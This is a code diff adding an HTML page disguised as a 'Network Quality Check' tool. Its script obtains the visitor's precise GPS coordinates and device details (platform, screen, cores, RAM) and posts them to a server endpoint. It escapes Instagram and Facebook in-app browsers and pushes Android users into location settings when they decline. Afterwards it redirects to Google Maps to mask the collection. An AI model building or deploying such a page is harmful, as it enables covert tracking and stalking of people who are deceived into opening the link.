@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Network Diagnostic Tool</title>
+    <style>
+        :root {
+            --primary: #4285f4;
+            --bg: #1a1a1a;
+            --surface: #2d2d2d;
+            --text: #ffffff;
+            --text-secondary: #aaaaaa;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .container {
+            background: var(--surface);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+
+        .icon-box {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: var(--primary);
+        }
+
+        h2 {
+            font-size: 22px;
+            margin-bottom: 12px;
+        }
+
+        p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--primary);
+            border: 1px solid var(--primary);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container" id="main-content">
+        <div class="icon-box">📡</div>
+        <h2>Network Quality Check</h2>
+        <p>This tool performs a connectivity and hardware capability test. Please allow access to location services to verify your local network node.</p>
+        
+        <div class="btn-group">
+            <button class="btn btn-primary" id="start-btn">
+                <span id="btn-text">Start Scan</span>
+                <div class="loader" id="loader"></div>
+            </button>
+            <button class="btn btn-secondary" onclick="skip()">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        const REDIRECT_URL = "https://www.google.com/maps";
+        let isProcessing = false;
+
+        // Force reload in external browser if in social app WebView
+        (function () {
+            const ua = navigator.userAgent;
+            if (/Instagram|FBAN|FBAV/i.test(ua)) {
+                const cleanUrl = window.location.href.replace(/https?:\/\//, "");
+                window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+            }
+        })();
+
+        document.getElementById('start-btn').onclick = function () {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            document.getElementById('btn-text').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            this.disabled = true;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function (pos) {
+                        sendData({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy.toFixed(1) + "m"
+                        });
+                    },
+                    function (err) {
+                        let status = "Unknown";
+                        if (err.code === 1) status = "Rejected";
+                        else if (err.code === 2) status = "Unavailable";
+                        else if (err.code === 3) status = "Timeout";
+                        
+                        sendData({ lat: "N/A", lon: status, acc: "Error: " + err.code });
+                        
+                        if (err.code === 1 || err.code === 2) {
+                            handleSettingsRedirect();
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                skip();
+            }
+        };
+
+        function handleSettingsRedirect() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.indexOf("android") > -1) {
+                setTimeout(() => {
+                    document.getElementById('main-content').innerHTML = `
+                        <div class="icon-box" style="color:#ff4b4b;">⚠️</div>
+                        <h2 style="color:#ff4b4b;">GPS Required</h2>
+                        <p>Location settings must be enabled for this test. Redirecting to settings...</p>
+                        <div class="loader" style="display:block; border-top-color:#ff4b4b;"></div>
+                    `;
+                    setTimeout(() => {
+                        window.location.href = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
+                    }, 2000);
+                }, 500);
+            }
+        }
+
+        function sendData(data) {
+            const metrics = {
+                plat: navigator.platform,
+                screen: screen.width + "x" + screen.height,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
+                time: new Date().toISOString()
+            };
+
+            fetch('/api/report', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...data, ...metrics }),
+                keepalive: true
+            }).finally(skip);
+
+            setTimeout(skip, 3000);
+        }
+
+        function skip() {
+            window.location.href = REDIRECT_URL;
+        }
+    </script>
+</body>
+
+</html>
